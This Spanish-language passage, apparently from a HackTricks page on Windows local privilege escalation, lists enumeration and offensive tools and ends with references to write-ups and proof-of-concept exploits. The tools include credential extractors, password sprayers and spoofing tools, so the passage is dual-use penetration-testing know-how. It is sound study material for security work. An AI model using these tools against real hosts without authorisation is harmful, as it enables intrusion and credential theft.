### De LOCAL SERVICE o NETWORK SERVICE a todos los privilegios

**Lee:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Más ayuda

[Binarios estáticos de impacket](https://github.com/ropnop/impacket_static_binaries)

## Herramientas útiles

**La mejor herramienta para buscar vectores de escalada de privilegios local en Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Busca errores de configuración y archivos confidenciales (**[**consulta aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detectado.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Busca posibles errores de configuración y recopila información (**[**consulta aquí**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Busca errores de configuración**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Extrae información de sesiones guardadas de PuTTY, WinSCP, SuperPuTTY, FileZilla y RDP. Usa -Thorough en local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extrae credenciales de Credential Manager. Detectado.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Prueba las contraseñas recopiladas en el dominio**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh es una herramienta de suplantación de ADIDNS/LLMNR/mDNS y man-in-the-middle para PowerShell.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Enumeración básica de Windows para privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Busca vulnerabilidades conocidas de privesc (DEPRECATED en favor de Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Comprobaciones locales **(requiere derechos de Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Busca vulnerabilidades conocidas de privesc (debe compilarse con VisualStudio) ([**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumera el host en busca de errores de configuración (es más una herramienta para recopilar información que para privesc) (debe compilarse) **(**[**precompilado**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Extrae credenciales de muchos programas (exe precompilado en GitHub)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port de PowerUp a C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Busca errores de configuración (ejecutable precompilado en GitHub). No recomendado. No funciona bien en Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Busca posibles errores de configuración (exe de Python). No recomendado. No funciona bien en Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Herramienta creada a partir de esta publicación (no necesita accesschk para funcionar correctamente, pero puede usarlo).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lee la salida de **systeminfo** y recomienda exploits funcionales (Python local)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lee la salida de **systeminfo** y recomienda exploits funcionales (Python local)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Debes compilar el proyecto usando la versión correcta de .NET ([consulta esto](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Para ver la versión de .NET instalada en el host víctima, puedes ejecutar:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Fundamentos de la escalada de privilegios en Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Escalada de privilegios mediante la explotación de permisos débiles en carpetas](http://www.greyhathacker.net/?p=738)
- [3] [Escalada de privilegios en Windows: una cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Taller de escalada local de privilegios en Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Ataques a Windows: AT es el nuevo negro (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Escalada de privilegios en Windows - Guía completa de OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Escalada de privilegios - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Guía de escalada de privilegios en Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista de comprobación de escalada de privilegios en Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Escalada de privilegios en Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Métodos de escalada de privilegios en Windows para pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: phishing con macro VBA de Word por SMTP → descifrado de credenciales de hMailServer → Veeam CVE-2023-27532 para obtener SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak de format-string + BOF en stack → ROP con VirtualAlloc (RCE) y robo de token del kernel](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – A la caza del zorro plateado: gato y ratón entre las sombras del kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Vulnerabilidad de sistema de archivos con privilegios presente en un sistema SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Herramientas para probar enlaces simbólicos – Uso de CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Un enlace al pasado. Abuso de los enlaces simbólicos en Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port de Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: resolución peligrosa de módulos en Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Módulos de Node.js: carga desde carpetas `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Retos de la lista de comprobación de C/C++, resueltos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Función RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Secuestro de binarios de servicios](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own con Microslop: encadenamiento de condiciones de carrera de CLDFLT y el kernel de DirectX para una escalada local de privilegios en Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Un I/O Ring para gobernarlos a todos: primitiva completa de lectura/escritura en Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Abuso de eliminaciones arbitrarias de archivos para escalar privilegios y otros trucos útiles](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Código de exploit FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Ataques a WSUS, parte 2: CVE-2020-1013, una escalada local de privilegios de un día en Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: exploración del Administrador de credenciales y Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - PoC de CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Delegación restringida basada en recursos de Kerberos: cuando un cambio de imagen provoca una escalada de privilegios](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Extracción de claves privadas SSH del agente SSH de Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Convertir servidores de actualización empresariales en fábricas de backdoors (0_o) – Parte 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Convertir servidores de actualización empresariales en fábricas de backdoors (0_o) – Parte 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
